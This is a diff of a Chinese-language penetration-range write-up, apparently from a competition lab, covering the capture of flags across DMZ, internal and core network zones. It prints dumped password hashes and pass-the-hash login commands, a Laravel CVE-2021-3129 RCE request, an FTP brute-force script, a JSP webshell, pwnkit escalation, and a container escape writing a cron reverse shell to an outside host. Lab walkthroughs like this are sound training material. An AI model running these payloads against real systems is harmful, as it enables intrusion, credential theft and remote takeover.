+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>49155</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=n>Administrator</span><span class=p>:</span><span class=mi>500</span><span class=p>:</span><span class=n>aad3b435b51404eeaad3b435b51404ee</span><span class=p>:</span><span class=n>c1cd39bfd103a65a50fe6c7199dab799</span><span class=p>:::</span>
+</span></span><span class=line><span class=cl><span class=n>Guest</span><span class=p>:</span><span class=mi>501</span><span class=p>:</span><span class=n>aad3b435b51404eeaad3b435b51404ee</span><span class=p>:</span><span class=mi>31</span><span class=n>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=p>:::</span>
+</span></span><span class=line><span class=cl><span class=n>krbtgt</span><span class=p>:</span><span class=mi>502</span><span class=p>:</span><span class=n>aad3b435b51404eeaad3b435b51404ee</span><span class=p>:</span><span class=mf>51103e514</span><span class=n>e91e837821f6c70b2fcbf3a</span><span class=p>:::</span>
+</span></span><span class=line><span class=cl><span class=n>DC</span><span class=o>$</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=n>aad3b435b51404eeaad3b435b51404ee</span><span class=p>:</span><span class=mi>31</span><span class=n>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=p>:::</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Kerberos</span> <span class=n>keys</span> <span class=n>grabbed</span>
+</span></span><span class=line><span class=cl><span class=n>krbtgt</span><span class=p>:</span><span class=n>aes256</span><span class=o>-</span><span class=n>cts</span><span class=o>-</span><span class=n>hmac</span><span class=o>-</span><span class=n>sha1</span><span class=o>-</span><span class=mi>96</span><span class=p>:</span><span class=mf>245e5824</span><span class=n>adfc248572451cb966eb44fea409149e70713f0b8400069732580b47</span>
+</span></span><span class=line><span class=cl><span class=n>krbtgt</span><span class=p>:</span><span class=n>aes128</span><span class=o>-</span><span class=n>cts</span><span class=o>-</span><span class=n>hmac</span><span class=o>-</span><span class=n>sha1</span><span class=o>-</span><span class=mi>96</span><span class=p>:</span><span class=mi>21</span><span class=n>fba0c76db699fb80c59730a1bb467c</span>
+</span></span><span class=line><span class=cl><span class=n>krbtgt</span><span class=p>:</span><span class=n>des</span><span class=o>-</span><span class=n>cbc</span><span class=o>-</span><span class=n>md5</span><span class=p>:</span><span class=n>dace764645ea2646</span>
+</span></span><span class=line><span class=cl><span class=n>DC</span><span class=o>$</span><span class=p>:</span><span class=n>aes256</span><span class=o>-</span><span class=n>cts</span><span class=o>-</span><span class=n>hmac</span><span class=o>-</span><span class=n>sha1</span><span class=o>-</span><span class=mi>96</span><span class=p>:</span><span class=mi>34</span><span class=n>c8b93f22c8c95d6c07a1a2bf35dcfae048091233406be6e16f89cdc1865db8</span>
+</span></span><span class=line><span class=cl><span class=n>DC</span><span class=o>$</span><span class=p>:</span><span class=n>aes128</span><span class=o>-</span><span class=n>cts</span><span class=o>-</span><span class=n>hmac</span><span class=o>-</span><span class=n>sha1</span><span class=o>-</span><span class=mi>96</span><span class=p>:</span><span class=mi>4</span><span class=n>c0c9af9f667ba964235c2d27b99e3c3</span>
+</span></span><span class=line><span class=cl><span class=n>DC</span><span class=o>$</span><span class=p>:</span><span class=n>des</span><span class=o>-</span><span class=n>cbc</span><span class=o>-</span><span class=n>md5</span><span class=p>:</span><span class=mi>43</span><span class=n>d519a4f22ca2a7</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Cleaning</span> <span class=n>up</span><span class=o>...</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>└─</span><span class=o>$</span> <span class=n>proxychains4</span> <span class=n>python3</span> <span class=n>wmiexec</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>hashes</span> <span class=n>aad3b435b51404eeaad3b435b51404ee</span><span class=p>:</span><span class=n>c1cd39bfd103a65a50fe6c7199dab799</span> <span class=n>company</span><span class=o>.</span><span class=n>local</span><span class=o>/</span><span class=n>Administrator</span><span class=err>@</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>config</span> <span class=n>file</span> <span class=n>found</span><span class=p>:</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>proxychains4</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>preloading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libproxychains</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>4</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>DLL</span> <span class=n>init</span><span class=p>:</span> <span class=n>proxychains</span><span class=o>-</span><span class=n>ng</span> <span class=mf>4.14</span>
+</span></span><span class=line><span class=cl><span class=n>Impacket</span> <span class=n>v0</span><span class=o>.</span><span class=mf>10.1</span><span class=o>.</span><span class=n>dev1</span> <span class=o>-</span> <span class=n>Copyright</span> <span class=mi>2022</span> <span class=n>Fortra</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>445</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>SMBv3</span><span class=o>.</span><span class=mi>0</span> <span class=n>dialect</span> <span class=n>used</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>135</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>proxychains</span><span class=p>]</span> <span class=n>Strict</span> <span class=n>chain</span>  <span class=o>...</span>  <span class=mf>172.30</span><span class=o>.</span><span class=mf>38.201</span><span class=p>:</span><span class=mi>8888</span>  <span class=o>...</span>  <span class=mf>192.168</span><span class=o>.</span><span class=mf>20.15</span><span class=p>:</span><span class=mi>49154</span>  <span class=o>...</span>  <span class=n>OK</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Launching</span> <span class=n>semi</span><span class=o>-</span><span class=n>interactive</span> <span class=n>shell</span> <span class=o>-</span> <span class=n>Careful</span> <span class=n>what</span> <span class=n>you</span> <span class=n>execute</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Press</span> <span class=n>help</span> <span class=k>for</span> <span class=n>extra</span> <span class=n>shell</span> <span class=n>commands</span>
+</span></span><span class=line><span class=cl><span class=n>C</span><span class=p>:</span>\<span class=o>&gt;</span><span class=n>type</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>Administrator</span>\<span class=n>Desktop</span>\<span class=n>flag</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=n>bcbdb15f</span><span class=o>-</span><span class=n>fad8</span><span class=o>-</span><span class=mi>4</span><span class=n>f18</span><span class=o>-</span><span class=n>b9d5</span><span class=o>-</span><span class=n>c5ff397bf275</span><span class=p>}</span>
+</span></span></code></pre></div><h2 id=3核心内网区>3、核心内网区</h2><p>总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt
+</span></span><span class=line><span class=cl>./f -np -h 192.168.30.0/24 -o 30.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ \     ___  ___ _ __ __ _  ___| | __ 
+</span></span><span class=line><span class=cl> / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+</span></span><span class=line><span class=cl>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+</span></span><span class=line><span class=cl>\____/     |___/\___|_|  \__,_|\___|_|\_\   
+</span></span><span class=line><span class=cl>                     fscan version: 1.6.3
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl>192.168.30.19:21 open
+</span></span><span class=line><span class=cl>192.168.30.13:80 open
+</span></span><span class=line><span class=cl>192.168.30.13:22 open
+</span></span><span class=line><span class=cl>192.168.30.19:22 open
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>alive ports len is: 4
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl>[*] WebTitle:http://192.168.30.13      code:200 len:7      title:Laravel
+</span></span><span class=line><span class=cl>[+] InfoScan:http://192.168.30.13      [Laravel] 
+</span></span><span class=line><span class=cl>已完成 1/4 [-] ssh 192.168.30.19:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+</span></span><span class=line><span class=cl>已完成 3/4 [-] ftp://192.168.30.19:21 www Passw0rd 530 Login incorrect.
 </span></span></code></pre></div><p>开了一个web服务器192.168.30.13 是laravel
-一个ftp 192.168.30.19是一个ftp。</p>
-<h3 id="搭建核心区代理">搭建核心区代理</h3>
-<p>因为每一层都是单通道，这里尝试把核心区代理到本地，方便对laravel进行渗透，其实这里只要把第二层内网区的网络代理到本地就可以到第三层
+一个ftp 192.168.30.19是一个ftp。</p><h3 id=搭建核心区代理>搭建核心区代理</h3><p>因为每一层都是单通道，这里尝试把核心区代理到本地，方便对laravel进行渗透，其实这里只要把第二层内网区的网络代理到本地就可以到第三层
 搭建代理逻辑如下
-1、在第一层DMZ区的192.168.10.10上搭建一个服务器端</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./gost -L forward+ssh://admin:123456@:17979
-</span></span></code></pre></div><p>2、在第二层内网区服务器上起动客户端，让第二层的网络环境到达第一层。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./gost -L<span class="o">=</span>socks5://:7777
-</span></span><span class="line"><span class="cl">./gost -L rtcp://0.0.0.0:7979/localhost:7777 -F forward+ssh://admin:123456@192.168.10.10:17979?ping<span class="o">=</span><span class="m">30</span>
+1、在第一层DMZ区的192.168.10.10上搭建一个服务器端</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>./gost -L forward+ssh://admin:123456@:17979
+</span></span></code></pre></div><p>2、在第二层内网区服务器上起动客户端，让第二层的网络环境到达第一层。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>./gost -L<span class=o>=</span>socks5://:7777
+</span></span><span class=line><span class=cl>./gost -L rtcp://0.0.0.0:7979/localhost:7777 -F forward+ssh://admin:123456@192.168.10.10:17979?ping<span class=o>=</span><span class=m>30</span>
 </span></span></code></pre></div><p>此时在192.168.10.10上执行curl -x socks5://localhost:17979 192.168.30.13 访问正常即可。
-结合第一层的代理，然后两层代理一起使用代理链的功能，本地就直接通30了，配置如下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1:8888
-</span></span><span class="line"><span class="cl">localhost:7979
-</span></span></code></pre></div><p>本地规则为 192.168.30.0/24 走proxychains</p>
-<h3 id="laravel--1921683013">Laravel : 192.168.30.13</h3>
-<p>laravel经典漏洞 <code>/_ignition/execute-solution debug rce CVE-2021-3129</code>
+结合第一层的代理，然后两层代理一起使用代理链的功能，本地就直接通30了，配置如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>127.0.0.1:8888
+</span></span><span class=line><span class=cl>localhost:7979
+</span></span></code></pre></div><p>本地规则为 192.168.30.0/24 走proxychains</p><h3 id=laravel--1921683013>Laravel : 192.168.30.13</h3><p>laravel经典漏洞 <code>/_ignition/execute-solution debug rce CVE-2021-3129</code>
 这个靶场的这个题是今年网鼎决赛-渗透赛道的原题，本人刚好参加并且网鼎决赛现场做出。
 ，思路为<code>任意文件读获取log位置，debug打反序列化rce</code>
-任意文件读的接口如下 /api/file</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">一步步读框架文件，读到配置文件</span>
-</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">30.13</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">file</span><span class="err">?</span><span class="n">filename</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">laravel</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">logging</span><span class="o">.</span><span class="n">php</span>
-</span></span><span class="line"><span class="cl"><span class="err">找到日志文件位置</span><span class="n">logs</span><span class="o">/</span><span class="n">tmplog</span><span class="o">/</span><span class="n">laravel_log</span><span class="o">.</span><span class="n">log</span>
+任意文件读的接口如下 /api/file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>一步步读框架文件，读到配置文件</span>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>30.13</span><span class=o>/</span><span class=n>api</span><span class=o>/</span><span class=n>file</span><span class=err>?</span><span class=n>filename</span><span class=o>=/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>laravel</span><span class=o>/</span><span class=n>config</span><span class=o>/</span><span class=n>logging</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=err>找到日志文件位置</span><span class=n>logs</span><span class=o>/</span><span class=n>tmplog</span><span class=o>/</span><span class=n>laravel_log</span><span class=o>.</span><span class=n>log</span>
 </span></span></code></pre></div><p>直接用网的exp，注意就是把log位置都改一下
-例如</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">POST /_ignition/execute-solution HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 192.168.30.13
-</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> WOW64<span class="p">;</span> rv:46.0<span class="o">)</span> Gecko/20100101 Firefox/46.0
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Accept: */*
-</span></span><span class="line"><span class="cl">Connection: close
-</span></span><span class="line"><span class="cl">Content-Type: application/json
-</span></span><span class="line"><span class="cl">Content-Length: <span class="m">326</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">{</span>
-</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span>: <span class="s2">&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span>,
-</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span>: <span class="o">{</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span>: <span class="s2">&#34;username&#34;</span>,
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;viewFile&#34;</span>: <span class="s2">&#34;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/tmplog/laravel_log.log&#34;</span>
-</span></span><span class="line"><span class="cl"> <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>在/var/www/html/laravel/public/写一个木马后可以访问，发现home目录下有flag和hint</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>www-data:/home<span class="o">)</span> $ cat flag.txt
-</span></span><span class="line"><span class="cl">flag<span class="o">{</span>6855969e-7557-4bf4-9c8c-f5f80ee8e666<span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">(</span>www-data:/home<span class="o">)</span> $ cat .hint.txt
-</span></span><span class="line"><span class="cl">hint: 
-</span></span><span class="line"><span class="cl">FTP:
-</span></span><span class="line"><span class="cl">ftpuser
-</span></span><span class="line"><span class="cl">SecretData_xxxx!@#
-</span></span><span class="line"><span class="cl">xxxx is four-digit!
-</span></span></code></pre></div><p>这个hint就是下一步用的</p>
-<h3 id="ftp--1921683019">FTP : 192.168.30.19</h3>
-<p>根据上面的提示 ftp密码是SecretData_xxxx!@#，
-写一个脚本生成</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">#python exp.py &gt; passwd.txt</span>
-</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SecretData_&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">)</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;!@#&#34;</span><span class="p">)</span>
-</span></span></code></pre></div><p>用超级弱口令导入用户名ftpuser，密码passwd.txt爆破</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#
+例如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>POST /_ignition/execute-solution HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 192.168.30.13
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>Windows NT 10.0<span class=p>;</span> WOW64<span class=p>;</span> rv:46.0<span class=o>)</span> Gecko/20100101 Firefox/46.0
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Type: application/json
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>326</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl> <span class=s2>&#34;solution&#34;</span>: <span class=s2>&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span>,
+</span></span><span class=line><span class=cl> <span class=s2>&#34;parameters&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;variableName&#34;</span>: <span class=s2>&#34;username&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;viewFile&#34;</span>: <span class=s2>&#34;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/tmplog/laravel_log.log&#34;</span>
+</span></span><span class=line><span class=cl> <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><p>在/var/www/html/laravel/public/写一个木马后可以访问，发现home目录下有flag和hint</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>www-data:/home<span class=o>)</span> $ cat flag.txt
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>6855969e-7557-4bf4-9c8c-f5f80ee8e666<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>www-data:/home<span class=o>)</span> $ cat .hint.txt
+</span></span><span class=line><span class=cl>hint: 
+</span></span><span class=line><span class=cl>FTP:
+</span></span><span class=line><span class=cl>ftpuser
+</span></span><span class=line><span class=cl>SecretData_xxxx!@#
+</span></span><span class=line><span class=cl>xxxx is four-digit!
+</span></span></code></pre></div><p>这个hint就是下一步用的</p><h3 id=ftp--1921683019>FTP : 192.168.30.19</h3><p>根据上面的提示 ftp密码是SecretData_xxxx!@#，
+写一个脚本生成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1>#python exp.py &gt; passwd.txt</span>
+</span></span><span class=line><span class=cl><span class=n>password</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>z</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;SecretData_&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>m</span><span class=p>)</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>m</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;!@#&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>用超级弱口令导入用户名ftpuser，密码passwd.txt爆破</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#
 </span></span></code></pre></div><p>连接发现有个报错<code>500 Illegal PORT command. 425 Use PORT or PASV first.</code>
 网上找了一下为啥，尝试<code>quote PASV</code> 改成被动模式，用windows的资源管理器打开发现可以复制出来了
-获取到flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{5923d77e-0765-4701-bc2d-fc1188fe953b}
-</span></span></code></pre></div><h1 id="2023-05-18-day2">2023 05 18 day2</h1>
-<h2 id="dmz区">DMZ区</h2>
-<h3 id="tomcat-rce">Tomcat-RCE</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">弱口令
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">admin:admin123!@#,有可能记错
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;FORM METHOD=GET ACTION=&#39;evil.jsp&#39;&gt;
-</span></span><span class="line"><span class="cl">    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
-</span></span><span class="line"><span class="cl">    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
-</span></span><span class="line"><span class="cl">    &lt;/FORM&gt;
-</span></span><span class="line"><span class="cl">    &lt;%@ page import=&#34;java.io.*&#34; %&gt;
-</span></span><span class="line"><span class="cl">    &lt;%
-</span></span><span class="line"><span class="cl">       String cmd = request.getParameter(&#34;cmd&#34;);
-</span></span><span class="line"><span class="cl">       String output = &#34;&#34;;
-</span></span><span class="line"><span class="cl">       if(cmd != null) {
-</span></span><span class="line"><span class="cl">          String s = null;
-</span></span><span class="line"><span class="cl">          try {
-</span></span><span class="line"><span class="cl">             Process p = Runtime.getRuntime().exec(cmd,null,null);
-</span></span><span class="line"><span class="cl">             BufferedReader sI = new BufferedReader(new
-</span></span><span class="line"><span class="cl">    InputStreamReader(p.getInputStream()));
-</span></span><span class="line"><span class="cl">             while((s = sI.readLine()) != null) { output += s+&#34;&lt;/br&gt;&#34;; }
-</span></span><span class="line"><span class="cl">          }  catch(IOException e) {   e.printStackTrace();   }
-</span></span><span class="line"><span class="cl">       }
-</span></span><span class="line"><span class="cl">    %&gt;
-</span></span><span class="line"><span class="cl">    &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jar -cvf ../webshell.war * <span class="c1"># 生成war包上传</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user1:asd123 <span class="c1">#ssh口令</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 登陆上去为user1用户需要提权，用户目录下应该有一个poc.c文件，pwnkit提权:CVE-2021-4034</span>
-</span></span><span class="line"><span class="cl">gcc poc.c -o poc, ./poc
-</span></span></code></pre></div><h2 id="内网">内网</h2>
-<h3 id="docker容器">docker容器</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># tomcat进去应该能翻到一个ssh口令</span>
-</span></span><span class="line"><span class="cl">root:deploy-20231212
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#端口:10022</span>
-</span></span><span class="line"><span class="cl">用这个口令去连内网中存在这个端口的服务器，上去是docker容器
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 特权容器逃逸操作</span>
-</span></span><span class="line"><span class="cl">fdisk -l <span class="c1"># 查看磁盘文件</span>
-</span></span><span class="line"><span class="cl">mkdir /tmp/data <span class="c1">#新建临时文件</span>
-</span></span><span class="line"><span class="cl">mount /dev/vda1 /tmp/data <span class="c1"># 挂着宿主机目录</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.3.2/8888 0&gt;&amp;1&#39;</span> &gt;&gt; /tmp/data/var/spool/cron/crontabs/root <span class="c1"># 写入定时文件反弹shell</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 逃逸成功后，在宿主机上查看另外一个容器,可以发现一个数据库密码</span>
-</span></span><span class="line"><span class="cl">sa:_H66rCce2psF4D5E8v2B6x3:master
-</span></span></code></pre></div><h3 id="sqlserverrce">SqlServerRCE</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sa:_H66rCce2psF4D5E8v2B6x3:master <span class="c1"># 用户名:密码:数据库</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># kali中 安装impacket的包, 里面有这个模块</span>
-</span></span><span class="line"><span class="cl">impacket-mssqlclient -db master sa:_H66rCce2psF4D5E8v2B6x3@192.168.153.147 <span class="c1">#链接远程数据库</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## 按照工具提示，启动一下xp_cmdshell,就可以执行命令了</span>
